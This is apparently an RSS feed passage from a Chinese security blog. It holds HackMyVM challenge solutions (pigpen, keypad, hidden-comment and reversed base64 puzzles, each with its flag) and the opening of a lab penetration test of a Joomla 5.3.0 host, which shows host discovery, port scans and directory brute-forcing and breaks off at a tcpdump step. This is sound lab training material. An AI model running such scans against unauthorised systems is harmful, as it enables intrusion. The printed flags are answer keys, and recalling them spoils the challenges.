Wr92lapVfd6kzpCbCCvIdV06dVDJkg9na1ubzaaAVi20c2uCBg14k+nzAG6rerWq2vDBak0OD9UD
JUpku2740CG65557TOwMgL2EBA2Tm1v2Xsp6eXlp6OCB2rE1Xi2aNeVNUQdCWEGu8/T01PChQ7Lc
rkb1atq0fq3CQycwfR5Almw2m1o2b6ad2xI0dPBAeXl53XH7JytWVPNmTfKoOwB5rXy5cmrb5rU7
bmOz2dS2dYB2bUtU/359mD7vgAgrecRms8nNzc1h/8uXL5/y5cuX7XcimjRupCpPP3Xb2xjqCOBu
/H2oZJvX/n2o5MiQ4bx7Cji5IQP7/+sbFwx1dA6WXQ3M2Xh6eurI91/bu408Y7PZNCJ4uNp16PzX
z4oUKaKB/fuq4+vt5eHhYcfuADiDYsV8FDphrLp06qDxoZP04Ucf/3Vb3Tq1DQ+aBOB4fHx81Ltn
d02dPvOvn5Ut+6hGBgepXt1X7NgZcostg7G/MFHvfgO0a/cehjoCMN2OXbs1IXSSTpw4qYS4DXqs
fHl7twQgD1y/fl11X22olJQUhjo6IcIKTHX69BmlpKYy1BFAnkhNTdWnBz9TrZo17N0KgDx0+PCX
Klv2UYY6OiHCCgAAAABL4gv2AAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIA
AADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJ
sAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAA
ACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggr
AAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADAkggrAAAAACyJsAIAAADA
kv4fmdy7yXs3RecAAAAASUVORK5CYII=


‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat ourobouros|base64 -d &gt; our
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll our
-rwxr-xr-x 1 kali kali 7775 Jun 21 01:02 our
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ file our                               
our: PNG image data, 811 x 137, 8-bit/color RGBA, non-interlaced
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ mv our our.png
                                  
```

![our](https://7r1umphk.github.io/image/20250621130302644.webp)

google‰∏Ä‰∏ã

![image-20250621130351324](https://7r1umphk.github.io/image/20250621130351621.webp)

https://www.dcode.fr/pigpen-cipher

![image-20250621130909609](https://7r1umphk.github.io/image/20250621130910070.webp)

Á¨¨‰∏Ä‰∏™

```
HMV{NOTILLUMINATI}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20049.html</guid><pubDate>Fri, 27 Jun 2025 09:29:51 +0000</pubDate></item><item><title>Challenge 011</title><link>https://7r1UMPHK.github.io/post/Challenge%20011.html</link><description># 1. ÂàùÊ≠•ÂàÜÊûê

**ÊåëÊàòÈìæÊé•:** https://hackmyvm.eu/challenges/challenge.php?c=011

![ÊåëÊàòÂõæÁâá](https://7r1umphk.github.io/image/20250518110146012.webp)

## 1. ÂàùÊ≠•ÂàÜÊûê

ÊåëÊàòÈ°µÈù¢ÊòæÁ§∫‰∫Ü‰∏ÄÊÆµË¢´ `&lt;pre&gt;` Ê†áÁ≠æÂåÖË£πÁöÑÊñáÊú¨ÔºåËøôÈÄöÂ∏∏ÊÑèÂë≥ÁùÄÂÖ∂‰∏≠ÁöÑÁ©∫Ê†ºÂíåÊç¢Ë°åÁ¨¶‰ºöË¢´‰øùÁïôÔºå‰ª•Áª¥ÊåÅÂÖ∂ÂéüÂßãÊ†ºÂºè„ÄÇÊñáÊú¨ÂÜÖÂÆπÂ¶Ç‰∏ãÔºö

```html
&lt;pre&gt; $$$$$$$$$$ $_________$$ $_$$$$$$$_$$ $_$_____$_$$ $_$_____$_$$ $_$_____$_$$ $_$_____$_$$ $_$$$$$$$_$$ $_________$$ $$$$$$$$$$ $_________$$ $_1__2__3_$$$ $_4__5__6_$$$ $_7__8__9_$$$ $_*__0__#_$$$ $_________$$$ $$$$$$$$$$$ $$$$$$$$$ FLAG: HMV{?} ? = 3-1 2-1 8-1 2-1 7-4 3-2 2-3 &lt;/pre&gt;
```

ËßÇÂØüËøôÊÆµÊñáÊú¨ÔºåÊàë‰ª¨ÂèØ‰ª•ÂèëÁé∞Âá†‰∏™ÂÖ≥ÈîÆÁÇπÔºö
1.  ÂâçÂçäÈÉ®ÂàÜÁî® `$` Âíå `_` Â≠óÁ¨¶ÁªòÂà∂‰∫Ü‰∏Ä‰∏™Á±ª‰ººÈîÆÁõòÁöÑÂõæÂΩ¢„ÄÇ
2.  Á¥ßÊé•ÁùÄÔºåËøô‰∏™ÂõæÂΩ¢‰∏ãÊñπÊúâ‰∫Ü‰∏Ä‰∏™Êõ¥ÊòéÁ°ÆÁöÑÊï∞Â≠óÈîÆÁõòÂ∏ÉÂ±ÄÔºö
    ```
    $_1__2__3_$$$
    $_4__5__6_$$$
    $_7__8__9_$$$
    $_*__0__#_$$$
    ```
    ËøôÈùûÂ∏∏ÂÉè‰∏Ä‰∏™Ê†áÂáÜÁöÑÁîµËØùÊã®Âè∑ÈîÆÁõò„ÄÇ
3.  ÊúÄÂÖ≥ÈîÆÁöÑ‰ø°ÊÅØÊòØ `FLAG: HMV{?} ? = 3-1 2-1 8-1 2-1 7-4 3-2 2-3`„ÄÇ
    ËøôË°®ÊòéÊàë‰ª¨ÈúÄË¶ÅÊ†πÊçÆÁªôÂá∫ÁöÑÂùêÊ†á `X-Y` Êù•‰ªéÁîµËØùÈîÆÁõò‰∏äÊâæÂá∫ÂØπÂ∫îÁöÑÂ≠óÁ¨¶Ôºå‰ª•ÊõøÊç¢ `?`„ÄÇ

## 2. Ëß£ÂØÜËøáÁ®ã

Ëøô‰∏™ÊåëÊàòÁöÑÊ†∏ÂøÉÊòØÁêÜËß£ÂùêÊ†á `X-Y` Â¶Ç‰ΩïÊò†Â∞ÑÂà∞ÁîµËØùÈîÆÁõò‰∏äÁöÑÂ≠óÁ¨¶„ÄÇ

### 2.1 ÁêÜËß£ÈîÆÁõòÂ∏ÉÂ±Ä‰∏éÁºñÁ†Å

Ê†áÂáÜÁöÑÁîµËØùÈîÆÁõòÊåâÈîÆÈÄöÂ∏∏‰∏éÂ≠óÊØçÁõ∏ÂÖ≥ËÅîÔºàÁî®‰∫é T9 ËæìÂÖ•Á≠âÔºâÔºö
*   `1`: (ÈÄöÂ∏∏Ê≤°ÊúâÂ≠óÊØçÔºåÊàñÊúâÁâπÊÆäÁ¨¶Âè∑)
*   `2`: `ABC`
*   `3`: `DEF`
*   `4`: `GHI`
*   `5`: `JKL`
*   `6`: `MNO`
*   `7`: `PQRS`
*   `8`: `TUV`
*   `9`: `WXYZ`
*   `0`: (ÈÄöÂ∏∏ÊòØÁ©∫Ê†ºÊàñ `+`)
*   `*`, `#`: ÁâπÊÆäÂäüËÉΩÈîÆ

ÁªôÂá∫ÁöÑÂùêÊ†áÊ†ºÂºèÊòØ `X-Y`„ÄÇÊàë‰ª¨ÂèØ‰ª•ÂêàÁêÜÂú∞Êé®Êñ≠Ôºö
*   `X` ‰ª£Ë°®ÁîµËØùÈîÆÁõò‰∏äÁöÑÊï∞Â≠óÈîÆ„ÄÇ
*   `Y` ‰ª£Ë°®ËØ•Êï∞Â≠óÈîÆ‰∏äÂØπÂ∫îÂ≠óÊØçÂ∫èÂàó‰∏≠ÁöÑÁ¨¨ `Y` ‰∏™Â≠óÊØçÔºà1-based indexÔºâ„ÄÇ

### 2.2 ÂùêÊ†áËß£Êûê

Áé∞Âú®Êàë‰ª¨Êù•ÈÄê‰∏™Ëß£ÊûêÁªôÂá∫ÁöÑÂùêÊ†á `3-1 2-1 8-1 2-1 7-4 3-2 2-3`Ôºö

1.  **`3-1`**:
    *   ÈîÆ `3` ÂØπÂ∫îÂ≠óÊØç `DEF`„ÄÇ
    *   Á¨¨ `1` ‰∏™Â≠óÊØçÊòØ `D`„ÄÇ

2.  **`2-1`**:
    *   ÈîÆ `2` ÂØπÂ∫îÂ≠óÊØç `ABC`„ÄÇ
    *   Á¨¨ `1` ‰∏™Â≠óÊØçÊòØ `A`„ÄÇ

3.  **`8-1`**:
    *   ÈîÆ `8` ÂØπÂ∫îÂ≠óÊØç `TUV`„ÄÇ
    *   Á¨¨ `1` ‰∏™Â≠óÊØçÊòØ `T`„ÄÇ

4.  **`2-1`**:
    *   ÈîÆ `2` ÂØπÂ∫îÂ≠óÊØç `ABC`„ÄÇ
    *   Á¨¨ `1` ‰∏™Â≠óÊØçÊòØ `A`„ÄÇ

5.  **`7-4`**:
    *   ÈîÆ `7` ÂØπÂ∫îÂ≠óÊØç `PQRS`„ÄÇ
    *   Á¨¨ `4` ‰∏™Â≠óÊØçÊòØ `S`„ÄÇ

6.  **`3-2`**:
    *   ÈîÆ `3` ÂØπÂ∫îÂ≠óÊØç `DEF`„ÄÇ
    *   Á¨¨ `2` ‰∏™Â≠óÊØçÊòØ `E`„ÄÇ

7.  **`2-3`**:
    *   ÈîÆ `2` ÂØπÂ∫îÂ≠óÊØç `ABC`„ÄÇ
    *   Á¨¨ `3` ‰∏™Â≠óÊØçÊòØ `C`„ÄÇ

### 2.3 ÁªÑÂêàËß£ÂØÜÂ≠óÁ¨¶

Â∞ÜËß£ÊûêÂá∫Êù•ÁöÑÂ≠óÊØçÁªÑÂêàËµ∑Êù•ÔºåÂæóÂà∞Ôºö`D A T A S E C`„ÄÇ

## 3. Ëé∑Âèñ Flag

Â∞Ü‰∏äÈù¢Ëß£ÂØÜÂæóÂà∞ÁöÑÂ≠óÁ¨¶‰∏≤ `DATASEC` ÊõøÊç¢Êéâ `FLAG: HMV{?}` ‰∏≠ÁöÑ `?`„ÄÇ

## 4. Flag

ÊúÄÁªàÁöÑ Flag ÊòØÔºö
```
HMV{DATASEC}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20011.html</guid><pubDate>Fri, 27 Jun 2025 09:29:48 +0000</pubDate></item><item><title>Challenge 009</title><link>https://7r1UMPHK.github.io/post/Challenge%20009.html</link><description># 1. ÂàùÊ≠•ÂàÜÊûê

**ÊåëÊàòÈìæÊé•:** https://hackmyvm.eu/challenges/challenge.php?c=009

![ÊåëÊàòÂõæÁâá](https://7r1umphk.github.io/image/20250518105248414.webp)

## 1. ÂàùÊ≠•ÂàÜÊûê

ËÆøÈóÆËØ•ÈìæÊé•ÂêéÔºåÈ°µÈù¢Êòæ‰∏ÄË°åÊñáÂ≠óÔºö

```html
The flag is here. &lt;!-- HMV{infrontofme} --&gt;
```
## 2. Flag

ÊúÄÁªàÁöÑ Flag ÊòØÔºö
```
HMV{infrontofme}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20009.html</guid><pubDate>Fri, 27 Jun 2025 09:29:46 +0000</pubDate></item><item><title>Challenge 007ÔºöÂèçËΩ¨Â≠óÁ¨¶‰∏éBase64Ëß£Á†ÅÂàÜÊûê</title><link>https://7r1UMPHK.github.io/post/Challenge%20007%EF%BC%9A-fan-zhuan-zi-fu-yu-Base64-jie-ma-fen-xi.html</link><description># ÂàùÂßãËßÇÂØü

*   **ÊåëÊàòÈìæÊé•:** [https://hackmyvm.eu/challenges/challenge.php?c=007](https://hackmyvm.eu/challenges/challenge.php?c=007)

## ÂàùÂßãËßÇÂØü

ËÆøÈóÆÊåëÊàòÈ°µÈù¢ÂêéÔºåÂ±ïÁ§∫‰∫Ü‰ª•‰∏ãÁªèËøáÁâπÊÆäÂ§ÑÁêÜÁöÑÂ≠óÁ¨¶‰∏≤Ôºö

![image-20250518101535788](https://7r1umphk.github.io/image/20250518101535983.webp)

ÂéüÂßãÂ≠óÁ¨¶‰∏≤‰∏∫Ôºö
```
=0Xd0 û∆êMOqWMœÇ–Øz…òW∆ñ∆é∆ß
```
ËØ•Â≠óÁ¨¶‰∏≤ÂåÖÂê´ÂèçËΩ¨Â≠óÁ¨¶Âíå Unicode ÁâπÊÆäÂ≠óÁ¨¶ÔºåÂàùÊ≠•Âà§Êñ≠ÈúÄË¶ÅËøõË°åÊñáÊú¨ÂèçËΩ¨ÂíåÂ≠óÁ¨¶ÊõøÊç¢Êìç‰Ωú„ÄÇÈÉ®ÂàÜÂ≠óÁ¨¶ÂèØËÉΩÂõ†Êú¨Âú∞Á≥ªÁªüÂ≠ó‰ΩìÂ∫ì‰∏çÂÆåÊï¥ËÄåÊòæÁ§∫ÂºÇÂ∏∏„ÄÇ

## Êé¢Á¥¢ËøáÁ®ã

ÈíàÂØπËØ•Â≠óÁ¨¶‰∏≤ÁöÑÁâπÊÄßÔºåÊàë‰ª¨ÈááÂèñ‰∫Ü‰ª•‰∏ãÊ≠•È™§ËøõË°åÂàÜÊûêÂíåËß£Á†Å„ÄÇ

### 1. Â≠óÁ¨¶‰∏≤ÂèçËΩ¨Â§ÑÁêÜ

È¶ñÂÖàÔºåÂØπÂéüÂßãÂ≠óÁ¨¶‰∏≤ËøõË°åÊï¥‰ΩìÂèçËΩ¨„ÄÇÂèØ‰ΩøÁî®Âú®Á∫øÊñáÊú¨ÂèçËΩ¨Â∑•ÂÖ∑Ôºå‰æãÂ¶Ç `textfixer.com` Êèê‰æõÁöÑÂ∑•ÂÖ∑Ôºö

![image-20250518102657623](https://7r1umphk.github.io/image/20250518102657806.webp)

[https://www.textfixer.com/tools/reverse-text-generator.php](https://www.textfixer.com/tools/reverse-text-generator.php)

ËæìÂÖ•ÂéüÂßãÂ≠óÁ¨¶‰∏≤ÂêéÔºåÂ∑•ÂÖ∑ËæìÂá∫ÁöÑÂèçËΩ¨ÁªìÊûúÔºàÊàñÊâãÂä®ÂèçËΩ¨Âπ∂ÈÉ®ÂàÜËßÑËåÉÂåñÂêéÔºâÂ¶Ç‰∏ãÔºö

![image-20250518102747809](https://7r1umphk.github.io/image/20250518102747978.webp)

```
SE∆ñWezRœÇMWqOM∆êk0dX0=
```
ÂèØ‰ª•ÁúãÂà∞ÔºåÈÉ®ÂàÜÊòì‰∫éËØÜÂà´ÁöÑÂèçËΩ¨Â≠óÁ¨¶ÔºàÂ¶Ç `–Ø` -&gt; `R`, ` û` -&gt; `k`ÔºâÂ∑≤Ë¢´Â∑•ÂÖ∑ÊàñÂàùÊ≠•ÊâãÂä®Â§ÑÁêÜËøòÂéüÔºå‰ΩÜ‰ªçÂ≠òÂú®‰∏Ä‰∫õÁâπÊÆä Unicode Â≠óÁ¨¶ÔºàÂ¶Ç `∆ñ`, `œÇ`, `∆ê`ÔºâÈúÄË¶ÅËøõ‰∏ÄÊ≠•Â§ÑÁêÜ„ÄÇ

### 2. ÁâπÊÆäÂ≠óÁ¨¶ËØÜÂà´‰∏éÊõøÊç¢

Êé•‰∏ãÊù•ÔºåÈúÄË¶ÅÂØπÂâ©‰ΩôÁöÑÁâπÊÆäÂ≠óÁ¨¶ËøõË°åËØÜÂà´ÔºåÂπ∂ÊõøÊç¢‰∏∫Ê†áÂáÜÁöÑ ASCII Â≠óÁ¨¶„ÄÇËøô‰∏ÄÊ≠•ÈÄöÂ∏∏Âü∫‰∫éÂ≠óÁ¨¶ÂΩ¢Áä∂ÁöÑÁõ∏‰ººÊÄßÂíåÂú®ÁºñÁ†Å‰∏≠ÔºàÂ¶Ç Base64ÔºâÁöÑÂ∏∏ËßÅÂØπÂ∫îÂÖ≥Á≥ªËøõË°åÊé®Êñ≠„ÄÇ

ÂéüÂßãÂèçËΩ¨Â≠óÁ¨¶‰∏≤Ôºö `SE∆ñWezRœÇMWqOM∆êk0dX0=`

Ê†πÊçÆÂ≠óÁ¨¶ÂΩ¢ÊÄÅËøõË°åÂ¶Ç‰∏ãÊõøÊç¢Ôºö
*   `œÇ` (Greek Small Letter Sigma Symbol) Á±ª‰ºº‰∫éÊï∞Â≠ó `2`„ÄÇÊõøÊç¢ÂêéÔºö
    `SE∆ñWezR2MWqOM∆êk0dX0=`
*   `∆ê` (Latin Capital Letter Open E) Á±ª‰ºº‰∫éÊï∞Â≠ó `3`„ÄÇÊõøÊç¢ÂêéÔºö
    `SE∆ñWezR2MWqOM3k0dX0=`
*   ËÄÉËôëÂà∞ Base64 ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶ÈõÜÔºå‰ª•Âèä‰∏ä‰∏ãÊñáÔºå`q` ÂèØËÉΩÂØπÂ∫î `p`Ôºå`d` ÂèØËÉΩÂØπÂ∫î `b`„ÄÇÊõøÊç¢ÂêéÔºö
    `SE∆ñWezR2MWpOM3k0bX0=`
*   `∆ñ` (Latin Letter Iota) Á±ª‰ºº‰∫éÊï∞Â≠ó `1`„ÄÇÊõøÊç¢ÂêéÔºö
    `SE1WezR2MWpOM3k0bX0=`

ÁªèËøá‰∏äËø∞Â≠óÁ¨¶ÊõøÊç¢ÔºåÂæóÂà∞‰∏Ä‰∏™ÁªìÊûÑÊõ¥Ê∏ÖÊô∞ÁöÑÂ≠óÁ¨¶‰∏≤Ôºö
```
SE1WezR2MWpOM3k0bX0=
```
ËØ•Â≠óÁ¨¶‰∏≤‰ª• `=` ÁªìÂ∞æÔºå‰∏îÂÖ∂Â≠óÁ¨¶ÈõÜÔºàÂ§ßÂÜôÂ≠óÊØç„ÄÅÂ∞èÂÜôÂ≠óÊØç„ÄÅÊï∞Â≠óÔºâÁ¨¶Âêà Base64 ÁºñÁ†ÅÁöÑÁâπÂæÅ„ÄÇ

### 3. Base64 Ëß£Á†Å

Á°ÆËÆ§Â≠óÁ¨¶‰∏≤‰∏∫ Base64 ÁºñÁ†ÅÂêéÔºå‰ΩøÁî® Base64 Ëß£Á†ÅÂ∑•ÂÖ∑ÊàñÂëΩ‰ª§ËøõË°åËß£Á†Å„ÄÇ
ÂèØ‰ª•‰ΩøÁî® `base64` ÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑Ôºö

ÊâßË°åÂëΩ‰ª§Ôºö
```bash
echo 'SE1WezR2MWpOM3k0bX0=' | base64 -d
```
Ëß£Á†ÅËæìÂá∫ÁªìÊûú‰∏∫Ôºö
```
HMV{4v1jN3y4m}
```
Ê≠§Âç≥‰∏∫ÊåëÊàòÁöÑ Flag„ÄÇ

## Flag

ÊúÄÁªàËé∑ÂèñÁöÑ Flag ‰∏∫Ôºö

`HMV{4v1jN3y4m}`sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20007%EF%BC%9A-fan-zhuan-zi-fu-yu-Base64-jie-ma-fen-xi.html</guid><pubDate>Fri, 27 Jun 2025 09:29:43 +0000</pubDate></item><item><title>Èù∂Êú∫ X1 Ê∏óÈÄèÊµãËØïÊä•Âëä</title><link>https://7r1UMPHK.github.io/post/ba-ji-%20X1%20-shen-tou-ce-shi-bao-gao.html</link><description>HelloÔºÅ‰ªäÂ§©ÂàÜ‰∫´‰∏Ä‰∏ãÈù∂Êú∫ X1 ÁöÑÊ∏óÈÄèËøáÁ®ã„ÄÇËøôÈù∂Êú∫ÂÖ∂ÂÆûÂèëÂ∏ÉÊúâÂá†Â§©‰∫ÜÔºå‰ΩÜÊàë‰∏ÄÁõ¥Ê≤°Âï•Á©∫„ÄÇ‰ªäÂ§©ÁûÖ‰∫Ü‰∏ÄÁúºÁæ§ÈáåÔºåÂ∞±‰∏Ä‰∏™‰∫∫Ëß£Âá∫Êù•‰∫ÜÔºåÁªôÊàëÊï¥Â•ΩÂ•á‰∫ÜÔºÅ

![image-20250511212617292](https://7r1umphk.github.io//image/20250511212617409.webp)

### ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜÔºåÊâìÊé¢ÊïåÊÉÖ

#### 1. ËÄÅËßÑÁü©Ôºå`arp-scan` ÂºÄË∑ØÊâæÈÇªÂ±Ö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l         
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       (Unknown)
192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
192.168.205.207 08:00:27:aa:93:a3       (Unknown)  &lt;-- ÁõÆÊ†áIP
192.168.205.254 00:50:56:ef:52:74       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded
```

ÁõÆÊ†áIPÈîÅÂÆöÔºö`192.168.205.207`„ÄÇ

#### 2. `nmap` Êâ´Á´ØÂè£ÔºåÁúãÁúãÂºÄ‰∫ÜÂï•ÊúçÂä°

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.207         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 09:26 EDT
Nmap scan report for 192.168.205.207
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:AA:93:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.16 seconds
```

ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£„ÄÇÈÇ£ÂøÖÈ°ªÂÖà‰ªé 80 Á´ØÂè£‰∏ãÊâãÔºÅ

#### 3. ËÆøÈóÆ80Á´ØÂè£ÔºåÂàùÊé¢WebÂ∫îÁî®

ÊµèËßàÂô®ÊâìÂºÄ `http://192.168.205.207/`Ôºö

![image-20250511212745043](https://7r1umphk.github.io/image/20250511212745266.webp)

ÁúãÁùÄÂÉèÊòØ‰∏™CMSÔºåÈ°µÈù¢‰∏äËøòÊúâ‰∏™ 'shark'ÔºàÈ≤®È±ºÔºâ„ÄÇÁõ¥ËßâÂëäËØâÊàëÔºå`nuclei` ËØ•ÂêØÂä®‰∫ÜÔºÅ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nuclei -u http://192.168.205.207/

# ... (ÈÉ®ÂàÜËæìÂá∫ÁúÅÁï•) ...

[joomla-manifest-file] [http] [medium] http://192.168.205.207/administrator/manifests/files/joomla.xml
[apache-detect] [http] [info] http://192.168.205.207/ ['Apache/2.4.62 (Debian)']
[corebos-htaccess] [http] [info] http://192.168.205.207/htaccess.txt
[joomla-detect:version] [http] [info] http://192.168.205.207/administrator/manifests/files/joomla.xml ['5.3.0']

# ... (ÂÖ∂‰ªñÊ£ÄÊµãÁªìÊûú) ...
```

ÊòØ JoomlaÔºåÁâàÊú¨ 5.3.0„ÄÇÊü•‰∫Ü‰∏Ä‰∏ãÔºåËøôÁâàÊú¨3Êúà‰ªΩÊâçÂèëÂ∏ÉÁöÑÁ¨¨‰∏âÁâàÔºåÁúüÂ§üÊñ∞È≤úÁöÑÔºàÊµÅÈºªÊ∂ïÔºâ„ÄÇËøôÊÑèÂë≥ÁùÄÂÖ¨ÂºÄÁöÑ Exploit ‰º∞ËÆ°ÊòØÊ≤°Êàè‰∫ÜÔºåÈô§ÈùûÂí±ËÉΩÁé∞Âú∫Êâì‰∏™0dayÔºåÈÇ£ÂΩìÊàëÊ≤°ËØ¥„ÄÇ

ËøòÊòØËÄÅËÄÅÂÆûÂÆûÊâæ‰ø°ÊÅØÂêß„ÄÇ

#### 4. ÁõÆÂΩïÁàÜÁ†¥ÔºåÁúãÁúãËóè‰∫ÜÂï•

Áî® `gobuster` Ë∑ë‰∏Ä‰∏ãÁõÆÂΩïÔºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.207/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,md,html
# ... (Êâ´ÊèèËøáÁ®ãÂíåÈÉ®ÂàÜÁªìÊûú) ...
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.207/images/]
/index.php            (Status: 200) [Size: 9102]
/README.txt           (Status: 200) [Size: 5034]
/robots.txt           (Status: 200) [Size: 764]
/administrator        (Status: 301) [Size: 326] [--&gt; http://192.168.205.207/administrator/]
/configuration.php    (Status: 200) [Size: 0] 
/htaccess.txt         (Status: 200) [Size: 6899]
# ... (ÂÖ∂‰ªñ301ÈáçÂÆöÂêë) ...
```

Êâ´Âá∫Êù•‰∏ÄÂ†Ü301ÔºåÊúâÁî®ÁöÑ‰∏çÂ§ö„ÄÇ

* `/index.php`ÔºöÈ¶ñÈ°µÔºåÂøΩÁï•„ÄÇ

* `/README.txt`ÔºöÊ≤°Âï•ÈöêËóè‰ø°ÊÅØ„ÄÇ

* `/robots.txt`ÔºöÂÜÖÂÆπÂ¶Ç‰∏ãÔºö

  ```
  User-agent: *
  Disallow: /administrator/
  Disallow: /api/
  Disallow: /bin/
  Disallow: /cache/
  Disallow: /cli/
  Disallow: /components/
  Disallow: /includes/
  Disallow: /installation/
  Disallow: /language/
  Disallow: /layouts/
  Disallow: /libraries/
  Disallow: /logs/
  Disallow: /modules/
  Disallow: /plugins/ 
  Disallow: /tmp/
  ```

  `/plugins/` ÁõÆÂΩïÁúãÁùÄÂèØÁñëÔºå‰ΩÜËÆøÈóÆ‰∫Ü‰∏Ä‰∏ãÔºå‰∏çÁªôÁúã...

* `/htaccess.txt`Ôºö‰πüÊ≤°Âï•ÈöêËóè‰ø°ÊÅØ„ÄÇ

#### 5. Joomla‰∏ìÁî®Êâ´ÊèèÂô® `joomscan` ÁôªÂú∫

Êâæ‰∫ÜÂçäÂ§©Ê≤°Âï•ËøõÂ±ïÔºåÊéèÂá∫‰∫Ü Joomla ‰∏ìÁî®Êâ´ÊèèÂô® `joomscan`Ôºö

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ joomscan --url http://192.168.205.207/
# ... (Êâ´ÊèèËøáÁ®ã) ...
[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 5.3.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://192.168.205.207/administrator/components
http://192.168.205.207/administrator/modules
http://192.168.205.207/administrator/templates
http://192.168.205.207/images/banners
# ... (ÂÖ∂‰ªñÂèëÁé∞) ...
```

`joomscan` ‰πüÊ≤°ÂèëÁé∞Âï•ÂÆûË¥®ÊÄßÁöÑÊºèÊ¥ûÔºåÂ∞±Âàó‰∫ÜÂá†‰∏™ËÉΩËÆøÈóÆÁöÑÁõÆÂΩï„ÄÇÊàëËøò‰ª•‰∏∫ËÉΩÊâíÊãâÂá∫‰∏™‰ªÄ‰πàÊèí‰ª∂ÊºèÊ¥ûÂë¢ÔºåÁªìÊûúËøôCMSÊØîÊàëÈí±ÂåÖÈÉΩÂπ≤ÂáÄ„ÄÇ

#### 6. ÈöæÈÅì‰∏çÊòØ80Á´ØÂè£ÔºüÊéíÊü•ÂÖ∂‰ªñÂèØËÉΩÊÄß

**IPv6 ÁûÖÁûÖÔºö**

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ping6 -I eth0 ff02::1
# ... (ping6 Ê≠£Â∏∏ÔºåÂèëÁé∞ fe80::a00:27ff:feaa:93a3%eth0) ...
‚îî‚îÄ$ nmap -6 -p- fe80::a00:27ff:feaa:93a3%eth0
# ... (Êâ´ÊèèÁªìÊûúËøòÊòØÂè™Êúâ 22 Âíå 80) ...
```

IPv6 ËøôËæπÊ≤°Âï•Âπ∫ËõæÂ≠ê„ÄÇ

**UDP Á´ØÂè£Êâ´‰∏Ä‰∏ãÂ∏∏ËßÅÁöÑÔºö**

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -sU --top-ports 100 192.168.205.207 
# ... (Êâ´ÊèèÁªìÊûú) ...
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

Â∏∏ËßÅÁöÑ100‰∏™UDPÁ´ØÂè£‰πüÊ≤°Âï•ÂèëÁé∞ÔºàÂ¶ÇÊûú‰ªñÁ´ØÂè£ÂºÄÂú®100ÂêçÂºÄÂ§ñÔºåÈÇ£ÂØπÊàëÂèØÁúüÊòØÁªùÊùÄ‰∫ÜÔºâ„ÄÇ

Ëøô‰∏ãÁªôÊàëÊï¥ÊÄÄÁñë‰∫∫Áîü‰∫ÜÔºåÂéªÁûÖ‰∫ÜÁúºÈù∂Êú∫ÈöæÂ∫¶Ôºö
![image-20250511215218183](https://7r1umphk.github.io/image/20250511215218301.webp)
'ÊØîËæÉÁÆÄÂçï'ÔºüÔºüÔºüÈöæÈÅìÊòØÊàëÂèòËèú‰∫ÜÔºüÔºüÔºü

#### 7. Â≥∞ÂõûË∑ØËΩ¨ÔºåÁõëÂê¨ÁΩëÁªúÊµÅÈáèÔºÅ

‰πãÂâçÈÅáÂà∞Ëøá‰ºöÂÆöÊó∂ÂèëÂåÖÁöÑÈù∂Êú∫ÔºåËØïËØïÁúãÊúâÊ≤°ÊúâÂä®Èùô„ÄÇ
`tcpdump` ÁõëÂê¨ ICMPÔºö

```shell
